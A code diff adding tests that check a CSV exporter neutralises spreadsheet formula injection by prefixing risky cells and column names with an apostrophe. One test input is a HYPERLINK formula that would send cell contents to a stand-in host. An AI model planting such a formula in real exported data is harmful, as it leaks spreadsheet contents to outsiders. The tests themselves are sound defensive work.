@@ -16,6 +16,27 @@ describe("toCsv", () => {
   it("pads rows shorter than the column list (Cosmos columns found later)", () => {
     expect(toCsv(columns, [[1]])).toBe("id,name,note\r\n1,,\r\n");
   });
+
+  it("stops spreadsheets running text that starts like a formula", () => {
+    const csv = toCsv(columns, [
+      [1, '=HYPERLINK("https://example.test/?"&A1,"x")', "+cmd"],
+      [2, "-2+3", "@SUM(A1)"],
+      [3, "\tTAB", "\rCR"],
+    ]);
+    expect(csv.split("\r\n").slice(1, 4)).toEqual([
+      `1,"'=HYPERLINK(""https://example.test/?""&A1,""x"")",'+cmd`,
+      `2,'-2+3,'@SUM(A1)`,
+      `3,'\tTAB,"'\rCR"`,
+    ]);
+  });
+
+  it("leaves numbers alone, including negative decimals the engine sends as text", () => {
+    expect(toCsv(columns, [[-5, "-1.50", "+2e3"]])).toBe("id,name,note\r\n-5,-1.50,+2e3\r\n");
+  });
+
+  it("guards column names too", () => {
+    expect(toCsv([{ name: "=evil", type: "" }], [])).toBe("'=evil\r\n");
+  });
 });
 
 describe("toJson", () => {
